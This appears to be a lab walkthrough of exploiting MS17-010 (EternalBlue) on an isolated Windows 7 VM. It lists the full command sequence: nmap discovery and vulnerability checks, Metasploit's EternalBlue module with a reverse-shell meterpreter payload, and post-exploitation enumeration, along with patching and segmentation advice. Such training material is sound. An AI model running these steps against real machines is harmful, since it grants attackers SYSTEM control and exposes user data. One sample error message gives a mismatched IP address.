# MS17-010 EternalBlue Exploitation Methodology

Complete step-by-step procedure for testing and exploiting MS17-010 vulnerability in controlled lab environment.

## Target Information
- **Vulnerability**: CVE-2017-0144 (MS17-010 EternalBlue)
- **Affected Systems**: Windows 7, Windows Server 2008/2012
- **Service**: SMB (Port 445/tcp)
- **Impact**: Remote Code Execution with SYSTEM privileges

## Lab Environment Setup
- **Attacker**: Kali Linux (192.168.1.5)
- **Target**: Windows 7 SP1 x64 (192.168.1.10)
- **Network**: VirtualBox Internal Network (isolated)

## Step 1: Network Discovery

```bash
# Discover live hosts
nmap -sn 192.168.1.0/24

# Result example:
# Nmap scan report for 192.168.1.10
# Host is up (0.00023s latency).
```

## Step 2: Service Enumeration

```bash
# Check for SMB service
nmap -p 445 192.168.1.10

# Service version detection
nmap -sV -p 445 192.168.1.10

# Expected output:
# 445/tcp open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds
```

## Step 3: Vulnerability Assessment

```bash
# MS17-010 specific vulnerability check
nmap --script smb-vuln-ms17-010 192.168.1.10

# Vulnerable system output:
# |_smb-vuln-ms17-010: VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

## Step 4: Metasploit Exploitation

```bash
# Start Metasploit Framework
msfconsole

# Search for MS17-010 exploits
search ms17-010

# Use EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configure target
set RHOSTS 192.168.1.10
set RPORT 445

# Select payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444

# Verify configuration
show options

# Check if target is vulnerable
check

# Execute exploit
exploit
```

## Step 5: Post-Exploitation Verification

```bash
# Verify session established
sessions -l

# Access meterpreter session
sessions -i 1

# Check current privileges
getuid
# Expected: NT AUTHORITY\SYSTEM

# System information
sysinfo

# Take screenshot for evidence
screenshot

# List running processes
ps
```

## Step 6: Evidence Collection

```bash
# System information gathering
sysinfo > system_info.txt

# Network configuration
ipconfig > network_config.txt

# User accounts
net user > user_accounts.txt

# Administrator group members
net localgroup administrators > admin_users.txt
```

## Expected Results

**Successful exploitation indicators:**
- Meterpreter session established
- NT AUTHORITY\SYSTEM privileges obtained
- Complete file system access
- Network connectivity maintained

## Remediation Verification

Test the same procedure on a patched Windows 7 system to verify that the vulnerability has been properly addressed.

```bash
# On patched system, exploit should fail:
# [-] 192.168.1.10:445 - Exploit failed: The connection was refused by the remote host (10.0.0.10:445).
```

## Key Learning Points

1. **MS17-010** affects unpatched Windows systems and provides immediate SYSTEM privileges
2. **SMB service** on port 445 is the attack vector
3. **No authentication** required for exploitation
4. **Patch management** is critical for preventing this vulnerability
5. **Network segmentation** can limit impact of successful exploitation